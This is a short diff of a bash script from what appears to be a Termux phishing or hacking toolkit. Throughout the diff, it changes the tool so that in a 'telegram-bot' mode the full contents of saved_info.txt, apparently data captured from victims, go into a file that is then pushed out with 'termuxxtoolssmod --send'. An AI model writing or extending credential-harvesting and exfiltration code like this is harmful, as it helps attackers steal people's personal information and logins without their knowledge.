@@ -93,7 +93,12 @@ do
 		echo
 		echo
 		echo -e "\e[32m$(cat saved_info.txt)\e[97m"
-		echo "[✓] BİLGİ GİRİLDİ" >.info
+		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
+		if [[ $control == telegram-bot ]];then
+			cat saved_info.txt > .info
+		else
+			echo "[✓] BİLGİ GİRİLDİ" >.info
+		fi
 		termuxxtoolssmod --send
 		echo
 		echo
@@ -118,7 +123,14 @@ do
 				echo
 				echo
 				echo -e "\e[32m$(cat saved_info.txt)\e[97m"
-				echo "[✓] BİLGİ GİRİLDİ" >.info
+	
+
+				control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)	
+				if [[ $control == telegram-bot ]];then
+					cat saved_info.txt > .info
+				else
+					echo "[✓] BİLGİ GİRİLDİ" >.info
+				fi
 				termuxxtoolssmod --send
 				echo
 				echo
@@ -150,7 +162,12 @@ do
 		echo
 		echo
 		echo -e "\e[32m$(cat saved_info.txt)\e[97m"
-		echo "[✓] BİLGİ GİRİLDİ" >.info
+		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
+		if [[ $control == telegram-bot ]];then
+			cat saved_info.txt > .info
+		else
+			echo "[✓] BİLGİ GİRİLDİ" >.info
+		fi
 		termuxxtoolssmod --send
 		echo
 		echo
